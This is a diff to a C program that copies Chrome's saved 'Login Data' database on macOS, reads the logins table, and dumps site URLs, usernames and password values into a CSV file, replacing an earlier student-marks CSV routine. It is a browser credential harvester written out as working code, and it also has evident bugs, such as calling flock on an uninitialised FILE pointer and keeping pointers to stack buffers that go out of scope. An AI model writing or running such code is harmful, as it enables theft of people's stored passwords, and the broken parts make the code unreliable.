@@ -2,6 +2,10 @@
 #include<string.h>
 #include <sqlite3.h>
 #include <stdlib.h>
+#include <sys/file.h>
+#include <unistd.h>
+
+int initial_csv = 0;
 
 struct user_info {
     char * url;
@@ -9,24 +13,39 @@ struct user_info {
     char * password;
 };
 
-void create_marks_csv(char *filename, int a[][3], int n, int m)
+// Adding line to the CSV File
+static void save_data(struct user_info *parent_)
 {
-    printf("\n Creating %s.csv file",filename);
+    char *filename = "Chrome_data.csv";
+
     FILE *fp;
-    int i,j;
-    filename=strcat(filename,".csv");
-    fp=fopen(filename,"w+");
-    fprintf(fp,"Student Id; Physics; Chemistry;pr Maths");
 
-    for(i=0;i<m;i++){
-        fprintf(fp,"\n%d",i+1);
-        for(j=0;j<n;j++)
-            fprintf(fp,";%d ",a[i][j]);
+    // Lock file
+    flock(fp, LOCK_SH);
+
+    // Opening File Mode : Initial or Append
+    if(initial_csv == 0)
+    {
+        printf("\nCreating %s file",filename);
+
+        fp=fopen(filename,"w+");
+        fprintf(fp,"Url; User; Password;");
+
+        initial_csv = 1;
+    } else
+    {
+        fp=fopen(filename,"a");
     }
-    fclose(fp);
-    printf("\n %sfile created",filename);
 
+    printf("\nAdding data...");
+    // Adding line information
+    fprintf(fp,"\n%s;%s;%s ",parent_->url, parent_->username, parent_->password);
+
+    fclose(fp);
+    // Release locked file
+    flock(fp, LOCK_UN);
 }
+
 
 static int callback(void * data, int argc, char **argv, char **azColName)
 {
@@ -38,16 +57,29 @@ static int callback(void * data, int argc, char **argv, char **azColName)
     {
         if(strcmp(azColName[i], "password_value") == 0)
         {
-            parent_->password = argv[i] ? argv[i] : "NULL";
+            // Adding Quote to the text
+            char passwordFormat[256];
+            sprintf(passwordFormat, "\"%s\"", argv[i]);
+            parent_->password = strcmp(argv[i], "") ? passwordFormat : "NULL";
         }
         else if(strcmp(azColName[i], "origin_url") == 0)
         {
-            parent_->url = argv[i] ? argv[i] : "NULL";
+            char urlFormat[256];
+            sprintf(urlFormat, "\"%s\"", argv[i]);
+            parent_->url = strcmp(argv[i], "") ? urlFormat : "NULL";
         }
         else if(strcmp(azColName[i], "username_value") == 0)
         {
-            parent_->username = argv[i] ? argv[i] : "NULL";
+            char usernameFormat[256];
+            sprintf(usernameFormat, "\"%s\"", argv[i]);
+            parent_->username = strcmp(argv[i], "") ? usernameFormat : "NULL";
         }
+    }
+
+    // Adding only valid Username & Password
+    if((strcmp(parent_->username, "NULL")) && (strcmp(parent_->password, "NULL")))
+    {
+        save_data(parent_);
     }
 
     return 0;
@@ -68,6 +100,7 @@ int main()
     userData_ = (struct user_info*) malloc(sizeof(struct user_info));
 
     // Copy file Logindata
+    printf("Search databases...\n");
     system("cp ~/Library/Application\\ Support/Google/Chrome/Default/Login\\ Data ./login_chrome");
 
     rc = sqlite3_open_v2("./login_chrome", &db, SQLITE_OPEN_READONLY, NULL);
@@ -77,6 +110,7 @@ int main()
         return EXIT_FAILURE;
     }
 
+    printf("Loading data...\n");
     // Create SQL statement
     sql = "SELECT * FROM 'logins'";
 
@@ -90,13 +124,5 @@ int main()
 
     sqlite3_close(db);
 
-    /*
-    int a[3][3]={{50,50,50},{60,60,60},{70,70,70}};
-    char str[100];
-
-    printf("\n Enter the filename :");
-    gets(str);
-    create_marks_csv(str,a,3,3);
-
-    return 0;*/
+    return 0;
 }
